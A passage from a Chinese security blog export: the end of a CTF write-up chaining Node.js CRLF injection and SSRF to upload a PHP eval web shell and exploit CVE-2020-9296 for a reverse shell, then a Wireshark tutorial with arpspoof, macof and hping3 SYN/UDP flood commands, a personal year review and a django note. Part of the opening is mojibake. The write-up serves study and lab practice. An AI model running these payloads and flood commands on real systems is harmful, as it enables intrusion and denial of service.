ĠňŔŔŐįıĮıčĊčĊŐŏœŔĠįŵŰŬůšŤĮŰŨŰĠňŔŔŐįıĮıčĊňůųŴĺĠıĲķĮİĮİĮıčĊŃůŮŴťŮŴĭŌťŮŧŴŨĺĠĴĳķčĊŃůŮŴťŮŴĭŔŹŰťĺĠŭŵŬŴũŰšŲŴįŦůŲŭĭŤšŴšĻĠŢůŵŮŤšŲŹĽĭĭĭĭŗťŢŋũŴņůŲŭłůŵŮŤšŲŹŪńŢĹňōŇŔũŸŁŁķŁŭĶčĊŕųťŲĭŁŧťŮŴĺĠōůźũŬŬšįĵĮİĠĨŗũŮŤůŷųĠŎŔĠıİĮİĻĠŗũŮĶĴĻĠŸĶĴĩĠŁŰŰŬťŗťŢŋũŴįĵĳķĮĳĶĠĨŋňŔōŌĬĠŬũūťĠŇťţūůĩĠŃŨŲůŭťįĹİĮİĮĴĴĳİĮķĲĠœšŦšŲũįĵĳķĮĳĶčĊŁţţťŰŴĺĠŴťŸŴįŨŴŭŬĬšŰŰŬũţšŴũůŮįŸŨŴŭŬīŸŭŬĬšŰŰŬũţšŴũůŮįŸŭŬĻűĽİĮĹĬũŭšŧťįšŶũŦĬũŭšŧťįŷťŢŰĬũŭšŧťįšŰŮŧĬĪįĪĻűĽİĮĸĬšŰŰŬũţšŴũůŮįųũŧŮťŤĭťŸţŨšŮŧťĻŶĽŢĳĻűĽİĮĹčĊŁţţťŰŴĭŅŮţůŤũŮŧĺĠŧźũŰĬĠŤťŦŬšŴťčĊŁţţťŰŴĭŌšŮŧŵšŧťĺĠźŨĭŃŎĬźŨĻűĽİĮĹčĊŃůůūũťĺĠŐňŐœŅœœŉńĽŮūĶķšųŴŶĶıŨűšŮųūūŤŤųŬūŧųŴĴčĊŃůŮŮťţŴũůŮĺĠţŬůųťčĊčĊĭĭĭĭĭĭŗťŢŋũŴņůŲŭłůŵŮŤšŲŹŪńŢĹňōŇŔũŸŁŁķŁŭĶčĊŃůŮŴťŮŴĭńũųŰůųũŴũůŮĺĠŦůŲŭĭŤšŴšĻĠŮšŭťĽĢōŁŘşņŉŌŅşœŉŚŅĢčĊčĊıİİİİİčĊĭĭĭĭĭĭŗťŢŋũŴņůŲŭłůŵŮŤšŲŹŪńŢĹňōŇŔũŸŁŁķŁŭĶčĊŃůŮŴťŮŴĭńũųŰůųũŴũůŮĺĠŦůŲŭĭŤšŴšĻĠŮšŭťĽĢŵŰŬůšŤťŤĢĻĠŦũŬťŮšŭťĽĢųŨťŬŬĮŰŨŰĢčĊŃůŮŴťŮŴĭŔŹŰťĺĠšŰŰŬũţšŴũůŮįůţŴťŴĭųŴŲťšŭčĊčĊļĿŰŨŰĠťŶšŬĨĤşŐŏœŔśĢŷŨůšŭũĢŝĩĻĿľčĊĭĭĭĭĭĭŗťŢŋũŴņůŲŭłůŵŮŤšŲŹŪńŢĹňōŇŔũŸŁŁķŁŭĶčĊŃůŮŴťŮŴĭńũųŰůųũŴũůŮĺĠŦůŲŭĭŤšŴšĻĠŮšŭťĽĢŕŰŬůšŤĢčĊčĊŕŰŬůšŤčĊĭĭĭĭĭĭŗťŢŋũŴņůŲŭłůŵŮŤšŲŹŪńŢĹňōŇŔũŸŁŁķŁŭĶĭĭčĊčĊŇŅŔĠįĠňŔŔŐįıĮıčĊŴťųŴĺ 构造请求： 12&gt; http.get(&#x27;http://192.168.123.37:2233/ĠňŔŔŐįıĮıčĊčĊŐŏœŔĠįŵŰŬůšŤĮŰŨŰĠňŔŔŐįıĮıčĊňůųŴĺĠıĲķĮİĮİĮıčĊŃůŮŴťŮŴĭŌťŮŧŴŨĺĠĴĳķčĊŃůŮŴťŮŴĭŔŹŰťĺĠŭŵŬŴũŰšŲŴįŦůŲŭĭŤšŴšĻĠŢůŵŮŤšŲŹĽĭĭĭĭŗťŢŋũŴņůŲŭłůŵŮŤšŲŹŪńŢĹňōŇŔũŸŁŁķŁŭĶčĊŕųťŲĭŁŧťŮŴĺĠōůźũŬŬšįĵĮİĠĨŗũŮŤůŷųĠŎŔĠıİĮİĻĠŗũŮĶĴĻĠŸĶĴĩĠŁŰŰŬťŗťŢŋũŴįĵĳķĮĳĶĠĨŋňŔōŌĬĠŬũūťĠŇťţūůĩĠŃŨŲůŭťįĹİĮİĮĴĴĳİĮķĲĠœšŦšŲũįĵĳķĮĳĶčĊŁţţťŰŴĺĠŴťŸŴįŨŴŭŬĬšŰŰŬũţšŴũůŮįŸŨŴŭŬīŸŭŬĬšŰŰŬũţšŴũůŮįŸŭŬĻűĽİĮĹĬũŭšŧťįšŶũŦĬũŭšŧťįŷťŢŰĬũŭšŧťįšŰŮŧĬĪįĪĻűĽİĮĸĬšŰŰŬũţšŴũůŮįųũŧŮťŤĭťŸţŨšŮŧťĻŶĽŢĳĻűĽİĮĹčĊŁţţťŰŴĭŅŮţůŤũŮŧĺĠŧźũŰĬĠŤťŦŬšŴťčĊŁţţťŰŴĭŌšŮŧŵšŧťĺĠźŨĭŃŎĬźŨĻűĽİĮĹčĊŃůůūũťĺĠŐňŐœŅœœŉńĽŮūĶķšųŴŶĶıŨűšŮųūūŤŤųŬūŧųŴĴčĊŃůŮŮťţŴũůŮĺĠţŬůųťčĊčĊĭĭĭĭĭĭŗťŢŋũŴņůŲŭłůŵŮŤšŲŹŪńŢĹňōŇŔũŸŁŁķŁŭĶčĊŃůŮŴťŮŴĭńũųŰůųũŴũůŮĺĠŦůŲŭĭŤšŴšĻĠŮšŭťĽĢōŁŘşņŉŌŅşœŉŚŅĢčĊčĊıİİİİİčĊĭĭĭĭĭĭŗťŢŋũŴņůŲŭłůŵŮŤšŲŹŪńŢĹňōŇŔũŸŁŁķŁŭĶčĊŃůŮŴťŮŴĭńũųŰůųũŴũůŮĺĠŦůŲŭĭŤšŴšĻĠŮšŭťĽĢŵŰŬůšŤťŤĢĻĠŦũŬťŮšŭťĽĢųŨťŬŬĮŰŨŰĢčĊŃůŮŴťŮŴĭŔŹŰťĺĠšŰŰŬũţšŴũůŮįůţŴťŴĭųŴŲťšŭčĊčĊļĿŰŨŰĠťŶšŬĨĤşŐŏœŔśĢŷŨůšŭũĢŝĩĻĿľčĊĭĭĭĭĭĭŗťŢŋũŴņůŲŭłůŵŮŤšŲŹŪńŢĹňōŇŔũŸŁŁķŁŭĶčĊŃůŮŴťŮŴĭńũųŰůųũŴũůŮĺĠŦůŲŭĭŤšŴšĻĠŮšŭťĽĢŕŰŬůšŤĢčĊčĊŕŰŬůšŤčĊĭĭĭĭĭĭŗťŢŋũŴņůŲŭłůŵŮŤšŲŹŪńŢĹňōŇŔũŸŁŁķŁŭĶĭĭčĊčĊŇŅŔĠįĠňŔŔŐįıĮıčĊŴťųŴĺ&#x27;) 返回包 123456789101112131415161718192021222324252627282930313233&gt; nc -lv 0.0.0.0 2233GET / HTTP/1.1POST /upload.php HTTP/1.1Host: 127.0.0.1Content-Length: 437Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryjDb9HMGTixAA7Am6User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.72 Safari/537.36Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9Accept-Encoding: gzip, deflateAccept-Language: zh-CN,zh;q=0.9Cookie: PHPSESSID=nk67astv61hqanskkddslkgst4Connection: close------WebKitFormBoundaryjDb9HMGTixAA7Am6Content-Disposition: form-data; name=&quot;MAX_FILE_SIZE&quot;100000------WebKitFormBoundaryjDb9HMGTixAA7Am6Content-Disposition: form-data; name=&quot;uploaded&quot;; filename=&quot;shell.php&quot;Content-Type: application/octet-stream&lt;?php eval($_POST[&quot;whoami&quot;]);?&gt;------WebKitFormBoundaryjDb9HMGTixAA7Am6Content-Disposition: form-data; name=&quot;Upload&quot;Upload------WebKitFormBoundaryjDb9HMGTixAA7Am6--GET / HTTP/1.1test: HTTP/1.1Host: 192.168.123.37:2233Connection: close 在SSRF中我们经常使用 Gopher 协议去攻击内网应用，比如Redis、MySQL、FTP等。但是当 Gopher 协议被过滤了之后，我们还可以通过HTTP协议并配合CRLF漏洞进行攻击，达到与 Gopher 协议一样的效果。 至此，完成了 nodejs CRLF 注入复现 再次回到题目中现在我们可以通过 题目的 GET 代理发送 POST请求（假如题目中的 node 版本是 &lt; 9），现在尝试利用漏洞，看看是否能利用成功。 构造 POC，node 或 F12 控制运行 12345678910111213// netflix 的内网 IP 地址netflix_host = &quot;10.0.49.14&quot;// 在复现 CVE-2020-9296 时生成的 BCEL 编码bcel_evil = &#x27;&#x27;// 以下不用改post_payload = &#x27;[\\u&#123;017b&#125;\\u&#123;0122&#125;name\\u&#123;0122&#125;:\\u&#123;0122&#125;$\\u&#123;017b&#125;\\u&#123;0127&#125;1\\u&#123;0127&#125;.getClass().forName(\\u&#123;0127&#125;com.sun.org.apache.bcel.internal.util.ClassLoader\\u&#123;0127&#125;).newInstance().loadClass(\\u&#123;0127&#125;&#x27; + bcel_evil + &#x27;\\u&#123;0127&#125;).newInstance().class\\u&#123;017d&#125;\\u&#123;0122&#125;,\\u&#123;0122&#125;ownerEmail\\u&#123;0122&#125;:\\u&#123;0122&#125;test@example.org\\u&#123;0122&#125;,\\u&#123;0122&#125;retryCount\\u&#123;0122&#125;:\\u&#123;0122&#125;3\\u&#123;0122&#125;,\\u&#123;0122&#125;timeoutSeconds\\u&#123;0122&#125;:\\u&#123;0122&#125;1200\\u&#123;0122&#125;,\\u&#123;0122&#125;inputKeys\\u&#123;0122&#125;:[\\u&#123;0122&#125;sourceRequestId\\u&#123;0122&#125;,\\u&#123;0122&#125;qcElementType\\u&#123;0122&#125;],\\u&#123;0122&#125;outputKeys\\u&#123;0122&#125;:[\\u&#123;0122&#125;state\\u&#123;0122&#125;,\\u&#123;0122&#125;skipped\\u&#123;0122&#125;,\\u&#123;0122&#125;result\\u&#123;0122&#125;],\\u&#123;0122&#125;timeoutPolicy\\u&#123;0122&#125;:\\u&#123;0122&#125;TIME_OUT_WF\\u&#123;0122&#125;,\\u&#123;0122&#125;retryLogic\\u&#123;0122&#125;:\\u&#123;0122&#125;FIXED\\u&#123;0122&#125;,\\u&#123;0122&#125;retryDelaySeconds\\u&#123;0122&#125;:\\u&#123;0122&#125;600\\u&#123;0122&#125;,\\u&#123;0122&#125;responseTimeoutSeconds\\u&#123;0122&#125;:\\u&#123;0122&#125;3600\\u&#123;0122&#125;,\\u&#123;0122&#125;concurrentExecLimit\\u&#123;0122&#125;:\\u&#123;0122&#125;100\\u&#123;0122&#125;,\\u&#123;0122&#125;rateLimitFrequencyInSeconds\\u&#123;0122&#125;:\\u&#123;0122&#125;60\\u&#123;0122&#125;,\\u&#123;0122&#125;rateLimitPerFrequency\\u&#123;0122&#125;:\\u&#123;0122&#125;50\\u&#123;0122&#125;,\\u&#123;0122&#125;isolationgroupId\\u&#123;0122&#125;:\\u&#123;0122&#125;myIsolationGroupId\\u&#123;0122&#125;\\u&#123;017d&#125;]&#x27;encode_post_payload = encodeURI(&#x27;http://0.0.0.0:3000/\\u&#123;0120&#125;HTTP/1.1\\u&#123;010D&#125;\\u&#123;010A&#125;Host:127.0.0.1:3000\\u&#123;010D&#125;\\u&#123;010A&#125;\\u&#123;010D&#125;\\u&#123;010A&#125;POST\\u&#123;0120&#125;/search?url=http://&#x27; + netflix_host + &#x27;:8080/api/metadata/taskdefs\\u&#123;0120&#125;HTTP/1.1\\u&#123;010D&#125;\\u&#123;010A&#125;Host:127.0.0.1:3000\\u&#123;010D&#125;\\u&#123;010A&#125;Content-Type:application/json\\u&#123;010D&#125;\\u&#123;010A&#125;Content-Length:&#x27; + post_payload.length + &#x27;\\u&#123;010D&#125;\\u&#123;010A&#125;\\u&#123;010D&#125;\\u&#123;010A&#125;&#x27; + post_payload+ &#x27;\\u&#123;010D&#125;\\u&#123;010A&#125;\\u&#123;010D&#125;\\u&#123;010A&#125;\\u&#123;010D&#125;\\u&#123;010A&#125;\\u&#123;010D&#125;\\u&#123;010A&#125;GET\\u&#123;0120&#125;/&#x27;)poc = &quot;GET /proxy?url=&quot; + encode_post_payload + &quot; HTTP/1.1&quot;console.log(poc) 这里的 encodeURI 编码 1 次是防止传输过程中特殊字符被干掉 。 console.log(poc) 输出的东西替换 HTTP 包第一行即可。 成功反弹 这个题目流程有点多，做个小总结 nodejs 数组绕过管理员登录 isPublic 绕过，通过 /proxy 获取 /flag 得到提示 通过 docker 默认网段，或者题目给的提示 fuzz 内网网段的8080端口 构造 CVE-2020-9296 Netflix Post POC 反弹 shell 利用 nodejs &lt; 9 进行 CRLF注入，发送 CVE-2020-9296 Netflix Post POC 最终通过 cat /flag 获取 flag","categories":[{"name":"ctf","slug":"ctf","permalink":"https://tari.moe/categories/ctf/"},{"name":"比赛","slug":"ctf/比赛","permalink":"https://tari.moe/categories/ctf/%E6%AF%94%E8%B5%9B/"}],"tags":[{"name":"ctf","slug":"ctf","permalink":"https://tari.moe/tags/ctf/"},{"name":"比赛","slug":"比赛","permalink":"https://tari.moe/tags/%E6%AF%94%E8%B5%9B/"}]},{"title":"Wireshark入门与实战","slug":"Wireshark入门与实战","date":"2021-04-01T13:13:59.000Z","updated":"2021-04-25T12:09:59.526Z","comments":true,"path":"2021/04/01/Wireshark入门与实战/","link":"","permalink":"https://tari.moe/2021/04/01/Wireshark%E5%85%A5%E9%97%A8%E4%B8%8E%E5%AE%9E%E6%88%98/","excerpt":"","text":"wireshark入门: https://www.bilibili.com/video/BV1X5411x7R4他这里顺序有点误，应该是 P1-P26，P32-P39，P27-P31 Wireshark 入门伯克利包过滤 - Wireshark包过滤BPF（Berkeley Packet Filter） 采用与自然语言相近的语法，利用语法构造字符串确定保留具体符合规则的数据包而忽略其他数据包 最简单语法空白字符，任何数据包都符合空白字符规则 语法规则 type表示对象 如 IP地址、子网或端口 -&gt; host、net、port dir 表示数据包传输的方向 -&gt; src、dst proto 表示与数据包匹配的协议类型 -&gt; ether、ip、tcp、arp 演示实例会发现直接在 Apply a display filter 里输入是无法过滤的， 新版的 wireshark 的 expression 功能在如下图所示这里在 wireshark 里，不是直接使用 host 来表示主机名和对应的 ip 地址，而是使用 ip.addr = &lt;ip&gt; 来表示其他也是类似，如 ip.src 和 ip.dst 在找服务这一块，服务都是以占用端口的形式展示的，因此可以通过这种形式来看怎么用，然后点OK即可。 也可以使用 逻辑运算符实现筛选，如 tcp.port == 80 and ip.src == 192.168.123.37当然也有类似补全的操作 wireshark包过滤器分类 - 遵循伯克利语法规则捕获过滤器 -&gt; 在抓包之前进行设置，在抓取时，就不会抓取不符合文件的数据包 只捕获目标端口为80的TCP数据包 -&gt; tcp dst port 80 捕获目的主机IP地址为 192.168.123.37 的数据包 -&gt; dst host 192.168.123.37 host 不支持 cidr 域名 书写 筛选过滤器 （显示过滤器）-&gt; 抓包之后进行应用的，即再次筛选然后显示过滤器有两种创建方式 输入框创建 当不知道如何创建就看下图这里 数据包细节面板创建 ... and Selected 表示 目前的过滤器 + and 进行连接一开始是只有 Selected 和 Not Selected 的 表达式规则 主题 + 运算符 + 值 逻辑关系 与 或 非 -&gt; and (&amp;&amp;) or (||) not (!) Wireshark 捕获数据包文件保存 杂项设置wireshark 数据包颜色的意思可以通过 视图 -&gt; 着色规则进行查看 wireshark 故障包过滤有5个等级 Error 严重错误，譬如：畸形数据包或识别出数据包协议头部的某些字段和预期值不符 Warning 一般性问题（应用程序问题或通信问题），譬如：TCP zero window ,TCP window full ,TCP报文段失序，TCP报文段丢失 Note 可能引发故障的异常现象（正常行为），譬如：TCP重传，重复确认，快速重传 Chat 符合常规流量的特征，譬如：SYN,FIN,RST Comment OK 123_ws.expert.severity &lt;&#x3D; Note或者_ws.expert.severity &lt;&#x3D; Chat 查看wireshark 内置文件路径 修改wireshark默认配置 Wireshark 网络分析# Wireshark 部署方式 远程数据包捕获方式1:开启远程桌面，rdp服务，在系统中安装wireshark进行抓包分析缺点: 在于远程登录过程中，都会产生无关与目的远程连接数据流量 方式2: wireshark 远程抓包windows服务端: winpcap -&gt; rpcapd 12cd &quot;C:\\Program Files (x86)\\WinPcap\\&quot;.\\rpcapd.exe -n 客户端: wireshark linuxmacos注意 macos 版本没有直接抓取数据包的功能，可参考https://distanceblog.github.io/2020/06/05/wireshark%E8%BF%9C%E7%A8%8B%E6%8A%93%E5%8C%85/ 本地数据包捕获wireshark 不能抓取本地环回网卡数据包不过可以使用 RawCaphttps://www.netresec.com/?page=RawCap 12# cmdRawCap.exe 然后浏览器访问 localhost 不过可以通过访问本机 ip 代替 localhost 间接捉取数据包（狗头 虚拟机数据包捕获选择对应网卡即可。。。 比如在 kali 上运行 1sudo netdiscover -r 192.168.18.1/24 哈哈哈哈，原来arp广播还真就这么直白，，Who has ….? Tell …（netdiscover 还真直白 ARP欺骗捕获数据包攻击原则 任何主机均能发送伪造包给局域网中的另一主机； 任一主机相信它们接受到的所有包； 当一个新的响应包到达时，它甚至在没有请求包被发送的情况下覆盖掉旧的记录。 实践kali 一般要先安装 1sudo apt install dsniff kali 上运行 123sudo arpspoof -i eth0 -t &lt;欺骗的目标&gt; &lt;我是谁&gt;# 如sudo arpspoof -i eth0 -t 192.168.123.37 192.168.123.1 然后此时在 192.168.123.37 这台机器上wireshark 选择网卡 eth0，因为是欺骗这一张网卡，wireshark 筛选过滤器填入 icmp 查看 12# 然后在 192.168.123.37 上 ping 网关ping 192.168.123.1 会发现 192.168.123.1 的 mac 地址是 kali的。。。所以在 192.168.123.37 上是上不了网的，除非kali上开启了数据包转发，当 ip_forward 为 0 时，欺骗的目标 上不了网，当该值为 1 时，会把192.168.123.37发送的数据包做转发给网关，就可以正常上网，但是192.168.123.37的数据包都会经过 kali。 Wireshark 网络安全链路层安全针对于交换机的安全问题MAC对称欺骗 —— macchange擦除只是暂时的，不是覆盖原来的mac地址，机器重启后就会恢复。通过MAC地址欺骗达到隐藏真实主机的目的 12345678-e 改变的是后三字节，即不改变生产厂商-a 同一类型的随机供应商地址 ( macchanger --list=Huawei 就是同一类型 )-A 随机厂商随机地址-p 永久修改-r 完全随机-l 查看支持的厂商-b-m 设置前需要关闭网卡 12345sudo ifconfig eth0 down# -m 不能自己完全随意起，如果前三字节不符合 mac 地址命名规范会报错# [ERROR] Could not change MAC: interface up or insufficient permissions: Cannot assign requested addresssudo macchanger -m 00:90:d1:33:33:33 eth0sudo ifconfig eth0 up 随机化设置 1sudo macchanger -r eth0 MAC地址泛洪分析 —— 溢出交换机CAM表交换机之所以可以交换数据，是因为交换机在内存中维护着一张CAM表，即 端口 &lt;-&gt; MAC地址当表被添满时，其他主机就无法在对应的端口正常交互数据 12345sudo macof -h# -x 源端口 -y 目的端口# 泛洪sudo macof -i eth0 wireshark 抓包分析因为实际中，主要数据包类型是 tcp 或 udp下面只有 ip 数据包，因此很可能有问题（当然有问题，哈哈很多无关的 ip 以及 mac地址，数据包很小 查找源头端口交换机 1display mac-address 找到对应的端口 防御策略限制交换机端口 MAC 地址数量，比如这个端口只能有3或5个，那他就只能添加3或5跳记录到CAM表，那么就无法溢出啦。 STP操纵生成树协议按照树的结构构造网络拓扑，避免形成回路。STP协议中的各交换机通过交换BPDU报文信息传播生成树信息，如果伪造BPDU报文，控制交换机的端口转发状态，从而动态改变网络拓扑，劫持网络流量到本地。 广播风暴ARP DHCP 通过在局域网中广播，占用网络资源，网络性能下降 -&gt; 网络速度变慢产生原因 网络短路引发广播风暴 -&gt; 8根连接 两两连接 -&gt; 互联网上网线导致网络性能下降 网络中存在环路引发广播风暴 网卡损坏引发广播风暴 蠕虫病毒引发广播风暴 网络层安全中间人安全测试 - 欺骗ARP协议 局域网内用来寻找主机发送数据包的协议，通过它可以找到指定 IP 地址对应的 MAC地址 每台终端设备都具有ARP缓存表 arp -a 查看缓存表 arp -d 删除缓存表 表的填充，寻找 IP 地址对应MAC地址，如果没有则广播此时设置的目标MAC地址为 (00:00:00:00:00:00) 是否具有IP地址对应的MAC地址，找到填充。 ARP协议分析介绍显示过滤器 arp 请求数据包 arp.opcode == 0x0001 响应数据包 arp.opcode == 0x0002 查看源 MAC 地址 arp.src.hw_mac == 00:00:00:00:00:00 arp.src.hw_mac == 00:00:00:00:00:00 &amp;&amp; arp.opcode == 0x0002 专家系统分析网关地址与局域网中的计算机具有一致的MAC地址 出现大量ARP数据包的原因 ARP主机扫描 ARP病毒进行通信 ARP欺骗 中间人安全测试 防御ARP欺骗措施 静态绑定ARP表 arp -s 网关的IP地址 网关的MAC地址 不适合大型网络使用 需要管理员权限 win netsh i i show in -&gt; 查看网卡编号 win netsh -c &quot;i i&quot; add neighbors &lt;网卡编号&gt; &lt;网关IP地址&gt; &lt;网关MAC地址&gt; - 验证是否静态绑定 `arp -a` 交换机也有端口安全配置，固定MAC和IP使用端口 不适合大型网络使用 交换机 DHCP-Snooping 交换机监听DHCP数据，提取IP和MAC建立DHCP Snooping的绑定表 划分VLAN 每一个VLAN就是一个广播域 -&gt; 限制网络范围 泪滴安全测试原理介绍 针对于IP协议的安全测试，主要是伪造IP地址和发送畸形数据包 向目标发送畸形数据包，使得IP数据包碎片在重组的过程中有重合的部分（偏移位置不够），从而导致目标系统无法进行重组，进一步导致系统奔溃而停止服务。 下载IP协议案例数据包: https://wiki.wireshark.org/SampleCaptures?action=AttachFile&amp;do=get&amp;target=teardrop.cap 根据数据包表示 Identification 来确实是否属于同一分组 分析 第8和第9个数据包偏移量仅为 24，远不够36。因此无法重组 不过对现在的计算机来说，泪滴测试不会对计算机造成很大的影响，所以基本不关心泪滴安全测试了。不够泪滴测试和ARP泛洪结合，还是能对计算机造成很大的困扰。 传输层安全传输层主要针对TCP和UDP协议，因此拒绝服务DOS（Denial of Service）也主要是基于这两个协议 TCP SYN 泛洪TCP连接介绍 客户端发送SYN到服务器 服务器响应 SYN+ACK 到客户机 客户机发送ACK到服务器 使用 wireshark 分析 TCP 三次握手数据包 TCP SYN flooding 安全测试原理 客户端发送syn服务端返回syn+ack，如果客户端不再发送ack，那么服务端将等待超时，重新发送syn+ack。如果是大量的等待，就可能导致服务器奔溃。 案例演示 1hping3 -q -n --rand-source -S -p 80 --flood &lt;目标IP地址&gt; -q: 安静模式 -n: 数字化输出，象征性输出主机地址 –rand-source: 随机源IP -S: 发送SYN数据包 -p: 指向端口 –flood: 使用泛洪 为了便于分析。打开 Statistics -&gt; Flow Graph先选择流类型为TCP发现客户端发送syn服务端返回syn+ack，但客户端不再发送ack，导致资源消耗。 TCP SYN flooding安全防御 丢弃第一个SYN数据包 -&gt; 用户体验差 反向探测 -&gt; 向源地址方向发送探测包，确定源地址合法性 代理模式 -&gt; 防火墙代理 -&gt; 即先与防火墙建立tcp连接 UDP 泛洪非连接状态的协议，简洁协议，控制选项少，不可靠，传输速率高，适合大文件传输 UDP协议关键点 源端口 目的端口 UDP报文长度 检验码 UDP flooding 安全测试原理: 测试人员向目标发送大量巨大的UDP数据包，就会使网络资源被耗尽 1sudo hping3 -q -n -a &lt;fake_ip&gt; --udp -s 53 -p &lt;dst_port&gt; --flood &lt;target_ip&gt; -d 1000 -a: 伪造的 ip-s: 53端口 UDP flooding 安全防御防火墙 限流: 将链路中的UDP报文控制在合理的范围，当超过指定值，则丢弃UDP报文 指纹学习: 先学习，在匹配 网络取证简析wireshark 恢复传输文件无论使用何种应用层协议，对于传输层来说都是TCP或UDP协议，来恢复一下wireshark官网提供的文件https://wiki.wireshark.org/SampleCaptures?action=AttachFile&amp;do=view&amp;target=http_with_jpegs.cap.gzhttp_with_jpegs.cap.gz 首先在显示过滤器中筛选具有jpeg内容的数据包: http contains &quot;jpeg&quot;选第一个，追踪tcp流最后点一下 Save as… 保存为 xxx.bin 就好，然后用16进制编辑器打开，JPEG的文件开始字节为 FF D8，文件结束字节为 FF D9然后把其余没用的都删除掉，这里因为结束符号就是最后了，因此把上图 FF D8 之前的都删除掉就好了。成功恢复。 取证实践案例https://forensicscontest.com/2009/09/25/puzzle-1-anns-bad-aim好像没了。。。然后在Github找了个: https://github.com/aarud/Pcaps/blob/master/evidence01.pcap 1.寻找Ann的通信好友名称根据题目名称提示 aim 通信，wireshark 自带 aim 解密这三项依次改为然后查看数据包，发现通信好友名称是 Sec558user1 2. 通信过程中的第一条信息内容是什么 3. Ann 通信过程中传输的文件名字显示过滤器输入 data，然后追踪tcp流文件名字 4. 还原Ann发送文件并得出文件幻数（magic number）文件幻数介绍: https://baike.baidu.com/item/magic%20number说直白点就是以 zip 之父的首字母PK来命名，对应的16进制是50 4B 03 0450(P)4B(K)03(文本结束)04(传输结束)，组合起来就是压缩包的标识开头。那为啥word文档的文件开头是这个，把word文档后缀改为.zip试试，这是微软2006年公布的OOXML规范。 显示过滤器输入 data，然后追踪tcp流另存为，xxx.bin，用16进制编辑器打开xxx.bin 5. 查看文件md5值 应用层网络安全暴力破解分析分析使用 medusa 破解 ssh 登录 后门分析某些软件具有其他的目的 -&gt; 设置隐藏后门这里针对vsftpd 2.3.4 后门帐号密码不要紧，有 :) 笑脸就行，因此这个后门也被称为笑脸后门，2333","categories":[{"name":"流量分析","slug":"流量分析","permalink":"https://tari.moe/categories/%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/"},{"name":"Wireshark","slug":"流量分析/Wireshark","permalink":"https://tari.moe/categories/%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/Wireshark/"},{"name":"MISC","slug":"流量分析/Wireshark/MISC","permalink":"https://tari.moe/categories/%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/Wireshark/MISC/"}],"tags":[{"name":"流量分析","slug":"流量分析","permalink":"https://tari.moe/tags/%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/"},{"name":"Wireshark","slug":"Wireshark","permalink":"https://tari.moe/tags/Wireshark/"},{"name":"MISC","slug":"MISC","permalink":"https://tari.moe/tags/MISC/"}]},{"title":"=======总结 & 手动分割线=======","slug":"手动分割线","date":"2021-04-01T10:40:39.000Z","updated":"2021-04-02T02:14:59.492Z","comments":true,"path":"2021/04/01/手动分割线/","link":"","permalink":"https://tari.moe/2021/04/01/%E6%89%8B%E5%8A%A8%E5%88%86%E5%89%B2%E7%BA%BF/","excerpt":"","text":"由于 notion 和 语雀 使用起来过于舒适，差点忘了自己还有个博客，直到 （逃 上次写博客还是大三上学期末，现在都差不多要毕业了。大二大三那会，在学校啥都干，从之前的文章也能看出，服务器运维、开发、CTF…. 顺便做个总结，这一年虽没写博客，不过找了两份实习，一个是做渗透测试、一个是安全攻防研究，还有学校各种各样的事情，好像上次跑 hexo d 还是不久之前（主要是被 notion 和 语雀 惯懒了）… 2020.4 - 2020.10 渗透测试实习生，算是正式入门网安吧…感谢组内大佬肯收留我个菜鸡，哈哈，一开始还很纠结，以后是做安全还是运维，所以各投了一份实习（刚过完年做师兄的疯狂安利下），面试和准备，发现还是对网安更敢兴趣一些~，所以选了网安。不过现在偶尔会想，要是当初我选了另外一个实习，现在会怎样？（毕竟两边面试都过了），实习过程中被各种带飞，认识了几个大佬，其中的项目经验，都给秋招打下了基础。 2020.10 - 2020.12 学校项目，模仿大佬的开源项目，结合深度学习和网安和同学一起做了个《基于A2C和MSF的自适应渗透测试工具》，作为代码和文档的主要贡献者，虽然没做到想象中效果，不过也是第一次尝试去学习和改动大佬的开源项目。虽然功能上没能做的很好（不过还是做了许多的不错的优化），但是以后对开源项目都不会有那种陌生的隔离感了（就这个语言学过，也写过项目，但看着大佬写的就是有点抽象） 2020.11 - 2021.3 安全攻防研究实习生，第一次在大型项目中技术上承担一定角色，挑战很大，过了一个月才习惯这些工作，之前实习主要是渗透，这次还有很多代码审计、尤其是hvv相关的，代码审计任务很繁重，平均一天要审个6000+行代码（而且还是各种语言，有的压根就不怎么熟悉…）。也做了很多尝试，比如威胁建模评审，安全红线落实等，也是第一次接触SDL，也由此知道为啥大厂核心业务漏洞会难挖，毕竟别人都有做SDL流程。当然除此之外，由于我们部门很看重产出，所以这次实习也没上次实习那么轻松。特别是我这个产品线，迭代了很多代，漏洞特别难挖，而且渗透也比较麻烦，因为环境比较复杂，没有在搞站那会随随便便抓个包改改参数那么舒服了~ 当然产出不仅仅是挖洞，还可以有安全研究分享，输出文档等等等等~ 总之就是从之前各种打杂到现在会稍微专注于一个方向，所以成长也挺快的，虽然还是很菜（x，其实主要还是被各种大佬带飞，少走了一些坑 （ 今年，虽然过年很久了，先立一些 flag 吧~，毕竟实习了两次，发现一些东西需要补补了 SDL，把实习学的做个总结并做一些拓展 云安全，先把威胁建模学个差不多，然后熟悉一波主流的云基础框架，毕竟工作要用到 二进制，常见漏洞点和利用方式要掌握，感觉熟悉二进制以后审计C/C++会舒服不少 代码审计，把白嫖过来的CTFSHOW入门大部分给刷完，巩固一波基础~ 迟些会把一些正常点的笔记放上来，2333","categories":[{"name":"总结","slug":"总结","permalink":"https://tari.moe/categories/%E6%80%BB%E7%BB%93/"},{"name":"小记","slug":"总结/小记","permalink":"https://tari.moe/categories/%E6%80%BB%E7%BB%93/%E5%B0%8F%E8%AE%B0/"}],"tags":[{"name":"小记","slug":"小记","permalink":"https://tari.moe/tags/%E5%B0%8F%E8%AE%B0/"},{"name":"总结","slug":"总结","permalink":"https://tari.moe/tags/%E6%80%BB%E7%BB%93/"}]},{"title":"django踩坑记","slug":"django踩坑记","date":"2020-01-02T00:50:23.000Z","updated":"2021-04-02T02:16:10.324Z","comments":true,"path":"2020/01/02/django踩坑记/","link":"","permalink":"https://tari.moe/2020/01/02/django%E8%B8%A9%E5%9D%91%E8%AE%B0/","excerpt":"","text":"python 虚拟环境pip install virtualenvpip install virtualenvwrapper-win # windows 使用此命令 好处,：可以一个环境对应一个项目 